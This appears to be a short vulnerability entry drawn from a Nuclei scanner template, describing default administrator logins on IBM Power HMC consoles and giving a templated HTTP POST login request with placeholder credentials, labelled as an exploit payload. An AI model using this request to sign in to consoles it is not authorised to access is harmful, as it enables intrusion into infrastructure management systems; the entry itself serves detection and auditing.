# Vulnerability: IBM Power HMC - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`ibm-hmc-default-login.yaml`)

## Description
IBM HMC default admin login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /hmc/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

j_username={{username}}&j_password={{password}}&j_newConsole=Dashboard&j_security_check=Log+in
```

